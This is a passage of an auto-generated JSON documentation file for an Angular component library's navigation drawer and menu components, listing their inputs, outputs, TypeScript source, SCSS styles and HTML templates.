          }
        ]
      }
    },
    {
      "name": "NavDrawerComponent",
      "id": "component-NavDrawerComponent-87d15264794f56f8c6ac51b10c659d748ff9e4e1dd38848aa6dcb0fec1f1f397050e011348ebd38f4d834dbe4935a2190d402e033f5b3da98ddc719ba754308c",
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-nav-drawer",
      "styleUrls": [
        "./nav-drawer.component.scss",
        "./nav-drawer.theme.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./nav-drawer.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "collapsed",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 27,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "navigationItems",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 29,
          "type": "Array<Navigation>",
          "decorators": []
        },
        {
          "name": "withAppHeader",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 31,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "activate",
          "defaultValue": "new EventEmitter()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 33,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "headerOffset",
          "defaultValue": "64",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 34,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 39,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onActivate",
          "args": [
            {
              "name": "item",
              "type": "Navigation",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 48,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "item",
              "type": "Navigation",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  EventEmitter,\n  Input,\n  Output,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Navigation } from './navigation';\nimport { StoThemeService } from '@ngx-stoui/common';\nimport { overlayAnimation } from '../animation';\n\n@Component({\n  selector: 'sto-nav-drawer',\n  templateUrl: './nav-drawer.component.html',\n  styleUrls: [ './nav-drawer.component.scss', './nav-drawer.theme.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  animations: [\n    overlayAnimation\n  ]\n})\nexport class NavDrawerComponent implements AfterViewInit {\n  @Input()\n  collapsed = false;\n  @Input()\n  navigationItems: Array<Navigation>;\n  @Input()\n  withAppHeader: boolean;\n  @Output()\n  activate = new EventEmitter();\n  public headerOffset = 64;\n\n  constructor(private themeService: StoThemeService, private cdr: ChangeDetectorRef) {\n  }\n\n  ngAfterViewInit() {\n    this.themeService\n      .getActiveTypography()\n      .subscribe(typography => {\n        this.headerOffset = typography.name === 'small' ? 48 : 64;\n        this.cdr.detectChanges();\n      });\n  }\n\n  onActivate(item: Navigation) {\n    this.activate.emit(item);\n    this.collapsed = true;\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "$transition: width ease 250ms;\n$size: 64px;\n$height: 48px;\n.mat-menu-item.no-hover {\n  font-weight: bold;\n}\n\n.sto-nav-drawer {\n  position: fixed;\n  z-index: 50;\n  padding-top: 8px;\n  left: 0;\n  top: 0;\n  display: flex;\n  flex-direction: column;\n  justify-content: space-between;\n  align-items: flex-end;\n\n  transition: $transition;\n\n  div.sto-nav-drawer-items {\n    overflow-y: auto;\n    overflow-x: hidden;\n  }\n\n  .expansion-button {\n    height: $height;\n    padding-left: 16px;\n\n  }\n\n  .disabled {\n    cursor: not-allowed;\n  }\n\n  .logo {\n    width: 100%;\n    padding-bottom: 8px;\n    padding-left: 20px;\n  }\n\n  div.sto-nav-drawer-items {\n    width: 100%;\n  }\n\n  &--collapsed {\n\n    width: $size;\n\n    .expansion-button {\n      padding-left: 12px;\n    }\n\n    > div.sto-nav-drawer-items {\n\n      .sto-nav-drawer--collapsed__item {\n        height: $height - 1px;\n        border-bottom-style: solid;\n        border-bottom-width: 2px;\n        /*        display: flex;\n                justify-content: center;\n                align-items: center;*/\n\n        .mat-button {\n          min-width: 64px;\n          width: 64px;\n          margin: 0;\n          height: $height - 1px;\n        }\n\n        a.mat-button {\n          /*          display: flex;\n                    justify-content: center;\n                    align-items: center;*/\n        }\n      }\n    }\n  }\n\n  &--expanded {\n    width: 316px;\n\n    .expansion-button {\n    }\n\n    &__item {\n      cursor: pointer;\n      width: 316px;\n      padding: 12px 24px;\n      display: grid;\n      grid-template-columns: 24px 1fr 24px;\n      grid-column-gap: 20px;\n\n      &.divider-below {\n        border-bottom: 2px solid var(--divider);\n      }\n\n      &.divider-above {\n        border-top: 2px solid var(--divider);\n      }\n    }\n  }\n\n  sto-nav-drawer-item {\n    display: block;\n    line-height: 24px;\n  }\n\n  sto-nav-drawer-list {\n    display: flex;\n    flex-direction: column;\n    margin-left: 56px;\n    overflow: hidden;\n\n    a {\n      text-decoration: none;\n    }\n\n    sto-nav-drawer-list-item {\n      display: flex;\n      flex-direction: column;\n      justify-content: center;\n      height: 48px;\n      border-left: 2px solid;\n      cursor: pointer;\n\n      a.active {\n        margin-left: -2px;\n        font-weight: 700;\n\n        span {\n          border-left-width: 2px;\n          border-left-style: solid;\n        }\n      }\n\n      a {\n        line-height: 48px;\n        height: 48px;\n        display: flex;\n        align-items: center;\n        justify-content: space-between;\n        padding-right: 24px;\n      }\n\n      a span {\n        line-height: 16px;\n        padding-left: 14px;\n      }\n    }\n\n  }\n}\n\n.sto-drawer__overlay {\n  position: fixed;\n  top: 0;\n  height: 100vh;\n  width: 100vw;\n  z-index: 40;\n  opacity: 0.08;\n}\n\n.sto-nav-drawer-menu + div {\n  left: 48px !important;\n\n  a.mat-menu-item:not(.disabled):hover {\n    text-shadow: 0px 0px 1px black;\n  }\n\n  a.mat-menu-item.disabled {\n    pointer-events: none;\n  }\n\n  .mat-menu-content .mat-divider {\n    margin-top: 0;\n    margin-bottom: 0;\n  }\n}\n",
          "styleUrl": "./nav-drawer.component.scss"
        },
        {
          "data": "@use '@angular/material' as mat;\n@import \"libs/core/src/style/theme/theme\";\n@import \"libs/core/src/style/theme/typography\";\n\n\nbody {\n  .mat-menu-item.no-hover {\n    color: var(--text-secondary);\n  }\n\n  .mat-menu-item.no-hover:hover:not([disabled]) {\n    background-color: var(--bg-default);\n  }\n\n  a.mat-menu-item.active-menu-route {\n    background-color: var(--primary-fill-activated);\n    color: var(--primary-resting);\n  }\n\n  a.mat-menu-item:not(.disabled):hover {\n    text-shadow: 0 0 1px var(--text);\n  }\n\n\n  .sto-nav-drawer {\n    background-color: var(--bg-default);\n    border-right: 1px solid var(--divider);\n\n    a.mat-button {\n      color: var(--text-secondary);\n\n      &.active {\n        background-color: var(--primary-fill-activated)\n      }\n\n      .mat-icon {\n        color: var(--text-secondary);\n      }\n    }\n\n    button:not(.mat-button-disabled) .mat-icon {\n      color: var(--text-secondary);\n    }\n\n    a.sto-nav-drawer--expanded__item {\n      text-decoration: none;\n\n      &:hover {\n        background-color: var(--bg-hover);\n      }\n\n      &.active {\n        font-weight: bold;\n      }\n    }\n\n    .sto-nav-drawer--expanded__item:not(.disabled) .mat-icon {\n      color: var(--text-secondary);\n    }\n\n    sto-nav-drawer-list-item {\n      border-color: var(--bg-primary);\n\n      a.active span {\n        color: var(--text-secondary);\n      }\n\n      &:not(.disabled):hover {\n        background-color: var(--bg-hover);\n      }\n    }\n\n    .sto-nav-drawer--collapsed__item {\n      border-bottom-color: var(--divider);\n    }\n\n    a:not(.disabled) {\n      color: var(--text);\n    }\n\n    a.active {\n      color: var(--text-secondary);\n    }\n\n    a.disabled {\n      pointer-events: none;\n      color: var(--text-disabled);\n\n      .mat-icon {\n        color: var(--text-disabled);\n      }\n    }\n\n    .disabled {\n      color: var(--text-disabled);\n\n      a {\n        color: var(--text-disabled);\n      }\n    }\n  }\n}\n\n\n@mixin navigation-drawer-typography($config) {\n  .sto-nav-drawer {\n    sto-nav-drawer-item {\n      font-size: mat.font-size($config, subheading-1);\n      line-height: mat.line-height($config, subheading-1);\n    }\n  }\n  .sto-nav-drawer-menu + div .mat-menu-item {\n    font-size: mat.font-size($config, subheading-1);\n  }\n}\n\n.mat-typography:not(.sto-sm-typography):not(.sto-l-typography) {\n  @include navigation-drawer-typography($sto-typography);\n}\n\n.mat-typography.sto-sm-typography {\n  @include navigation-drawer-typography($sto-sm-typography);\n}\n\n.mat-typography.sto-l-typography {\n  @include navigation-drawer-typography($sto-l-typography);\n}\n",
          "styleUrl": "./nav-drawer.theme.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "themeService",
            "type": "StoThemeService",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 34,
        "jsdoctags": [
          {
            "name": "themeService",
            "type": "StoThemeService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "AfterViewInit"
      ],
      "templateData": "<nav class=\"sto-nav-drawer\"\n     [style.height]=\"withAppHeader ? 'calc(100vh - ' + headerOffset +  'px)' : '100vh'\"\n     [style.top.px]=\"withAppHeader ? headerOffset : 0\"\n     [class.sto-nav-drawer--collapsed]=\"collapsed\"\n     [class.sto-nav-drawer--expanded]=\"!collapsed\">\n  <div class=\"sto-nav-drawer-items\">\n    <div class=\"expansion-button\"\n         [style.width]=\"collapsed ? '100%' : '100%'\">\n      <button mat-icon-button\n              (click)=\"collapsed = !collapsed\">\n        <mat-icon>{{collapsed ? 'last_page' : 'first_page'}}</mat-icon>\n      </button>\n    </div>\n    <sto-nav-drawer-item [collapsed]=\"collapsed\"\n                         (activate)=\"onActivate($event)\"\n                         *ngFor=\"let item of navigationItems\"\n                         [navigationItem]=\"item\"></sto-nav-drawer-item>\n  </div>\n  <div class=\"logo\">\n    <mat-icon svgIcon=\"equinor\"></mat-icon>\n  </div>\n</nav>\n<div @overlay\n     class=\"sto-drawer__overlay\"\n     [style.left]=\"0\"\n     *ngIf=\"!collapsed\"\n     (click)=\"collapsed = !collapsed\"></div>\n"
    },
    {
      "name": "NavDrawerItemComponent",
      "id": "component-NavDrawerItemComponent-2055b30d44a4ce0f1797217134d55a9c73d0c2d19a00f0dc6bc329317f86ebf777f881b5a25210d499fc57a716ae4e9165b464db02f586ad5201e5b0797cde4a",
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer-item/nav-drawer-item.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-nav-drawer-item",
      "styleUrls": [],
      "styles": [],
      "templateUrl": [
        "./nav-drawer-item.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "collapsed",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 32,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "navigationItem",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 30,
          "type": "Navigation",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "activate",
          "defaultValue": "new EventEmitter<Navigation>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 35,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_expansionState",
          "defaultValue": "'collapsed'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "\"collapsed\" | \"expanded\"",
          "optional": false,
          "description": "",
          "line": 33,
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "toggleExpansionState",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 45,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output, ViewEncapsulation } from '@angular/core';\nimport { Navigation } from '../navigation';\nimport { animate, state, style, transition, trigger } from '@angular/animations';\nimport { EXPANSION_PANEL_ANIMATION_TIMING } from '@angular/material/expansion';\n\n@Component({\n  selector: 'sto-nav-drawer-item',\n  templateUrl: './nav-drawer-item.component.html',\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  animations: [\n      /** Animation that rotates the indicator arrow. */\n      trigger('indicatorRotate', [\n        state('collapsed, void', style({transform: 'rotate(0deg)'})),\n        state('expanded', style({transform: 'rotate(180deg)'})),\n        transition('expanded <=> collapsed, void => collapsed',\n          animate(EXPANSION_PANEL_ANIMATION_TIMING)),\n      ]),\n      /** Animation that expands and collapses the panel content. */\n      trigger('bodyExpansion', [\n        state('collapsed, void', style({height: '0px', visibility: 'hidden'})),\n        state('expanded', style({height: '*', visibility: 'visible'})),\n        transition('expanded <=> collapsed, void => collapsed',\n          animate(EXPANSION_PANEL_ANIMATION_TIMING)),\n      ]),\n  ]\n})\nexport class NavDrawerItemComponent {\n  @Input()\n  navigationItem: Navigation;\n  @Input()\n  collapsed: boolean;\n  private _expansionState: 'collapsed' | 'expanded' = 'collapsed';\n  @Output()\n  activate = new EventEmitter<Navigation>();\n\n  public get expansionState() {\n    return this.collapsed ? 'collapsed' : this._expansionState;\n  }\n\n  public set expansionState(state) {\n    this._expansionState = state;\n  }\n\n  toggleExpansionState() {\n    if ( !this.navigationItem.children || this.navigationItem.children.length === 0 ) {\n      return;\n    }\n    this.expansionState = this.expansionState === 'collapsed' ? 'expanded' : 'collapsed';\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "accessors": {
        "expansionState": {
          "name": "expansionState",
          "setSignature": {
            "name": "expansionState",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "state",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 41,
            "jsdoctags": [
              {
                "name": "state",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "expansionState",
            "type": "",
            "returnType": "",
            "line": 37
          }
        }
      },
      "templateData": "<div class=\"sto-nav-drawer--collapsed__item\"\n     *ngIf=\"collapsed\">\n  <a mat-button\n     [title]=\"navigationItem.label\"\n     [class.disabled]=\"navigationItem.disabled\"\n     (click)=\"activate.emit(navigationItem)\"\n     routerLinkActive=\"active\"\n     [href]=\"navigationItem.link\"\n     *ngIf=\"navigationItem.link && !navigationItem.children\">\n    <mat-icon *ngIf=\"!navigationItem.svgIcon\">{{ navigationItem.icon }}</mat-icon>\n    <mat-icon *ngIf=\"navigationItem.svgIcon\"\n              [svgIcon]=\"navigationItem.icon\"></mat-icon>\n  </a>\n  <a mat-button\n     [title]=\"navigationItem.label\"\n     [class.disabled]=\"navigationItem.disabled\"\n     routerLinkActive=\"active\"\n     (click)=\"activate.emit(navigationItem)\"\n     [routerLink]=\"navigationItem.route\"\n     *ngIf=\"navigationItem.route && !navigationItem.children\">\n    <mat-icon *ngIf=\"!navigationItem.svgIcon\">{{ navigationItem.icon }}</mat-icon>\n    <mat-icon *ngIf=\"navigationItem.svgIcon\"\n              [svgIcon]=\"navigationItem.icon\"></mat-icon>\n  </a>\n  <button mat-button\n          [title]=\"navigationItem.label\"\n          *ngIf=\"navigationItem.children\"\n          [matMenuTriggerFor]=\"menu\"\n          [disabled]=\"navigationItem.disabled\">\n    <mat-icon *ngIf=\"!navigationItem.svgIcon\">{{ navigationItem.icon }}</mat-icon>\n    <mat-icon *ngIf=\"navigationItem.svgIcon\"\n              [svgIcon]=\"navigationItem.icon\"></mat-icon>\n  </button>\n  <mat-menu #menu=\"matMenu\"\n            xPosition=\"after\"\n            [overlapTrigger]=\"true\"\n            backdropClass=\"sto-nav-drawer-menu\">\n    <span mat-menu-item\n          class=\"no-hover\"\n          (click)=\"$event.stopPropagation()\"\n          [disableRipple]=\"true\"\n          *ngIf=\"navigationItem.title\"\n          style=\"cursor: default;\">{{ navigationItem.title }}</span>\n    <mat-divider *ngIf=\"navigationItem.title\"></mat-divider>\n    <ng-container *ngFor=\"let item of navigationItem.children\">\n      <a [routerLink]=\"item.route\"\n         (click)=\"activate.emit(navigationItem)\"\n         [disabled]=\"item.disabled\"\n         [class.disabled]=\"item.disabled\"\n         routerLinkActive=\"active-menu-route\"\n         mat-menu-item\n         *ngIf=\"item.route\">\n        {{ item.label }}\n      </a>\n      <a [href]=\"item.link\"\n         mat-menu-item\n         [attr.target]=\"item.target || null\"\n         (click)=\"activate.emit(navigationItem)\"\n         [disabled]=\"item.disabled\"\n         [class.disabled]=\"item.disabled\"\n         *ngIf=\"item.link\">\n        {{ item.label }}\n      </a>\n    </ng-container>\n  </mat-menu>\n</div>\n<div class=\"sto-nav-drawer--expanded__item\"\n     [class.divider-below]=\"navigationItem.divider === 'below'\"\n     [class.divider-above]=\"navigationItem.divider === 'above'\"\n     *ngIf=\"!collapsed && navigationItem.children\"\n     [class.disabled]=\"navigationItem.disabled\"\n     (click)=\"toggleExpansionState()\">\n  <mat-icon *ngIf=\"!navigationItem.svgIcon\">{{ navigationItem.icon }}</mat-icon>\n  <mat-icon *ngIf=\"navigationItem.svgIcon\"\n            [svgIcon]=\"navigationItem.icon\"></mat-icon>\n  <a>{{ navigationItem.label }}</a>\n  <mat-icon [@indicatorRotate]=\"expansionState\">expand_more</mat-icon>\n</div>\n<a class=\"sto-nav-drawer--expanded__item\"\n   [class.divider-below]=\"navigationItem.divider === 'below'\"\n   [class.divider-above]=\"navigationItem.divider === 'above'\"\n   [href]=\"navigationItem.link\"\n   (click)=\"activate.emit(navigationItem)\"\n   matRipple\n   *ngIf=\"!collapsed && !navigationItem.children && navigationItem.link\"\n   [class.disabled]=\"navigationItem.disabled\">\n  <mat-icon *ngIf=\"!navigationItem.svgIcon\">{{ navigationItem.icon }}</mat-icon>\n  <mat-icon *ngIf=\"navigationItem.svgIcon\"\n            [svgIcon]=\"navigationItem.icon\"></mat-icon>\n  <span>{{ navigationItem.label }}</span>\n</a>\n<a class=\"sto-nav-drawer--expanded__item\"\n   [class.divider-below]=\"navigationItem.divider === 'below'\"\n   [class.divider-above]=\"navigationItem.divider === 'above'\"\n   [routerLink]=\"navigationItem.route\"\n   (click)=\"activate.emit(navigationItem)\"\n   routerLinkActive=\"active\"\n   matRipple\n   *ngIf=\"!collapsed && !navigationItem.children && navigationItem.route\"\n   [class.disabled]=\"navigationItem.disabled\">\n  <mat-icon *ngIf=\"!navigationItem.svgIcon\">{{ navigationItem.icon }}</mat-icon>\n  <mat-icon *ngIf=\"navigationItem.svgIcon\"\n            [svgIcon]=\"navigationItem.icon\"></mat-icon>\n  <span>{{ navigationItem.label }}</span>\n</a>\n<sto-nav-drawer-list [@bodyExpansion]=\"expansionState\"\n                     (activate)=\"activate.emit(navigationItem)\"\n                     *ngIf=\"navigationItem.children\"\n                     [navigationItems]=\"navigationItem.children\"></sto-nav-drawer-list>\n\n\n"
    },
    {
      "name": "NavDrawerListComponent",
      "id": "component-NavDrawerListComponent-8d428f96fc83c73d518bb7281eb0bd54beeff143ad36bd88331a5a052084a3ffedbf2a5b981f8dd78036c5cf109dbf6f3bb800dad39363596fd60fbe9bd437e5",
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer-list/nav-drawer-list.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-nav-drawer-list",
      "styleUrls": [],
      "styles": [],
      "templateUrl": [
        "./nav-drawer-list.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "navigationItems",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "Array<NavigationChild>",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "activate",
          "defaultValue": "new EventEmitter<NavigationChild>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output, ViewEncapsulation } from '@angular/core';\nimport { NavigationChild } from '../navigation';\n\n@Component({\n  selector: 'sto-nav-drawer-list',\n  templateUrl: './nav-drawer-list.component.html',\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class NavDrawerListComponent {\n  @Input()\n  navigationItems: Array<NavigationChild>;\n  @Output()\n  activate = new EventEmitter<NavigationChild>();\n}\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "templateData": "<sto-nav-drawer-list-item class=\"sto-nav-drawer-list\"\n                          [class.disabled]=\"item.disabled\"\n                          (activate)=\"activate.emit(item)\"\n                          *ngFor=\"let item of navigationItems\"\n                          [navigationItem]=\"item\"></sto-nav-drawer-list-item>\n"
    },
    {
      "name": "NavDrawerListItemComponent",
      "id": "component-NavDrawerListItemComponent-40bdd913ab6d508290dc88f960ba7eedf015e42d2ff654da2736008f9979fae5998b5a7563819858a52206e97237699ac17f173b065919a123848112a958de7d",
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer-list-item/nav-drawer-list-item.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-nav-drawer-list-item",
      "styleUrls": [],
      "styles": [],
      "templateUrl": [
        "./nav-drawer-list-item.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "navigationItem",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "NavigationChild",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "activate",
          "defaultValue": "new EventEmitter<NavigationChild>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output, ViewEncapsulation } from '@angular/core';\nimport { NavigationChild } from '../navigation';\n\n@Component({\n  selector: 'sto-nav-drawer-list-item',\n  templateUrl: './nav-drawer-list-item.component.html',\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class NavDrawerListItemComponent {\n  @Input()\n  navigationItem: NavigationChild;\n  @Output()\n  activate = new EventEmitter<NavigationChild>();\n}\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "templateData": "<ng-template #linkContent >\n  <span>\n    {{ navigationItem.label }}\n  </span>\n  <mat-icon *ngIf=\"navigationItem.target && navigationItem.target === '_blank'\">open_in_new</mat-icon>\n</ng-template>\n\n<a *ngIf=\"navigationItem.link\"\n   [href]=\"navigationItem.link\"\n   (click)=\"activate.emit(navigationItem)\"\n   [class.disabled]=\"navigationItem.disabled\"\n   [attr.target]=\"navigationItem.target || null\"\n   [routerLinkActive]=\"'active'\">\n  <ng-container *ngTemplateOutlet=\"linkContent\"></ng-container>\n</a>\n<a *ngIf=\"navigationItem.route\"\n   [routerLink]=\"navigationItem.route\"\n   [attr.target]=\"navigationItem.target || null\"\n   (click)=\"activate.emit(navigationItem)\"\n   [class.disabled]=\"navigationItem.disabled\"\n   [routerLinkActive]=\"'active'\">\n  <ng-container *ngTemplateOutlet=\"linkContent\"></ng-container>\n</a>\n"
    },
    {
      "name": "NavigationMenuComponent",
      "id": "component-NavigationMenuComponent-f82a4ceb0eaa86dcd89c0249cd51ea0bcdaa658e0f20b01f414dbf2a4c475a62079d43e80cec0624d201df9cabc2a13aa761ee5c5f1f3a5ad67931fd77b0b440",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu.component.ts",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-navigation-menu",
      "styleUrls": [],
      "styles": [],
      "templateUrl": [
        "./navigation-menu.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "menu",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 11,
          "type": "Menu",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "onCommand",
          "defaultValue": "new EventEmitter<NavigateCommand>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 13,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, EventEmitter, Input, Output, ViewEncapsulation } from '@angular/core';\nimport { Menu, NavigateCommand } from './menu';\n\n@Component({\n  selector: 'sto-navigation-menu',\n  templateUrl: './navigation-menu.component.html',\n  encapsulation: ViewEncapsulation.None\n})\nexport class NavigationMenuComponent {\n\n  @Input() menu: Menu;\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\n  @Output() onCommand = new EventEmitter<NavigateCommand>();\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "templateData": "<ng-container *ngIf=\"menu\">\n\t<mat-list class=\"sto-navigation\">\n\t\t<ng-container *ngFor=\"let group of menu.groups;  let last = last\">\n\t\t\t<mat-divider *ngIf=\"group.hasDivider\" class=\"sto-navigation__divider\"></mat-divider>\n\t\t\t<ng-container >\n\t\t\t\t<mat-expansion-panel class=\"sto-navigation__dropdown\" *ngIf=\"group.icon;else normal\">\n\t\t\t\t\t<mat-expansion-panel-header class=\"sto-navigation__dropdown__header\" expandedHeight=\"48px\">\n\t\t\t\t\t\t<mat-panel-title  class=\"sto-navigation__dropdown__title\" >\n\t\t\t\t\t\t\t<span class=\"sto-navigation__prefix\" >\n\t\t\t\t\t\t\t\t<mat-icon *ngIf=\"group.svgIcon\" [svgIcon]=\"group.icon\"></mat-icon>\n\t\t\t\t\t\t\t\t<mat-icon *ngIf=\"!group.svgIcon\" matListIcon>{{group.icon}}</mat-icon>\n\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t {{group.name}}\n\t\t\t\t\t\t</mat-panel-title>\n\t\t\t\t\t</mat-expansion-panel-header>\n\t\t\t\t\t<ng-container *ngFor=\"let item of group.items\">\n\t\t\t\t\t\t<sto-navigation-menu-item [item]=\"item\" (onCommand)=\"onCommand.emit($event)\" ></sto-navigation-menu-item>\n\t\t\t\t\t</ng-container>\n\t\t\t\t</mat-expansion-panel>\n\t\t\t</ng-container>\n\t\t\t<ng-template #normal>\n\t\t\t\t<h3 *ngIf=\"group.name\" mat-subheader>{{group.name}}</h3>\n\t\t\t\t<ng-container *ngFor=\"let item of group.items\">\n\t\t\t\t\t<sto-navigation-menu-item [item]=\"item\" (onCommand)=\"onCommand.emit($event)\"></sto-navigation-menu-item>\n\t\t\t\t</ng-container>\n\n\t\t\t</ng-template>\n\n\n\n\t\t</ng-container>\n\t</mat-list>\n</ng-container>\n"
    },
    {
      "name": "NavigationMenuItemComponent",
      "id": "component-NavigationMenuItemComponent-bbc29eaf01e52268b49e1f6360d8fff47a1e92676267e66740388900f6688b8fcf1118b3913b298fbb049b475cbc6da5f68475dda390810c2d6904c01bb6834e",
      "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu-item/navigation-menu-item.component.ts",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-navigation-menu-item",
      "styleUrls": [],
      "styles": [],
      "templateUrl": [
        "./navigation-menu-item.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "item",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "MenuItem",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "onCommand",
          "defaultValue": "new EventEmitter<NavigateCommand>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 16,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "menuItemTypes",
          "defaultValue": "MenuItemTypes",
          "deprecated": false,
